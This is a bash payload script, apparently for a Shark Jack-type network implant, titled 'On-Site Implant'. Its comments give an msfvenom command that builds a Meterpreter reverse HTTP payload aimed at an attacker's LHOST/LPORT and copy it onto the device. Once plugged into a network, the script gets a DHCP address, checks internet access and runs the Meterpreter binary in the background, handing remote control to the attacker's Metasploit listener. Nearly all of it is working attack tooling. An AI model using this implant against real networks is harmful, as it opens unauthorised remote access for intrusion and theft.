#!/bin/bash
#
# Title:        On-Site Implant
#
# Description:  Uses a "Meterpreter Payload"
#               for remote access via a reverse HTTP.
#
# Author:       TW-D
# Updates:      psycore8
# Version:      1.1
# Category:     Remote Access
#
# REQUIREMENTS
# ===============
# root@shark:~# opkg update
# root@shark:~# opkg install coreutils-timeout
# hacker@computer:~$ msfvenom --payload linux/mipsle/meterpreter_reverse_http LHOST=<LHOST> LPORT=<LPORT> --format elf --out ./meterpreter
# hacker@computer:~$ scp ./meterpreter root@172.16.24.1:/root/
#
# NOTE
# ===============
# (increase of the duration) During "LED FINISH" plug a power bank.
#
# STATUS
# ===============
# Magenta solid ................................... SETUP
# Yellow single blink ............................. ATTACK
# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
#

readonly EXTERNAL_URL="http://ident.me/"
readonly METERPRETER_PAYLOAD="/root/meterpreter"

set -u

LED SETUP

SERIAL_WRITE [*] init DHCP Client

NETMODE DHCP_CLIENT

SERIAL_WRITE [*] wait for IP address...

dhcp=$(timeout 30 /bin/bash -c 'while ! ifconfig eth0 | grep "inet addr"; do sleep 3; done')
if [ -n "${dhcp}" ]
then
    SERIAL_WRITE [+] IP address received
    SERIAL_WRITE [*] checking internet connection..
    internet=$(timeout 15 /bin/bash -c "wget ${EXTERNAL_URL} -qO /dev/null" 2>&1)
    if [ -z "${internet}" ]
    then
        SERIAL_WRITE [+] Internet connection test successful
        LED ATTACK
        SERIAL_WRITE [*] starting ATTACK...
        chmod +x "${METERPRETER_PAYLOAD}"
        /bin/bash -c "${METERPRETER_PAYLOAD}" &

        LED FINISH
        SERIAL_WRITE [+] DONE! Check metasploit
    else
        LED FAIL2
        SERIAL_WRITE [-] no internet connection available
        halt
    fi

else
    LED FAIL
    SERIAL_WRITE [-] no IP address received
    halt
fi
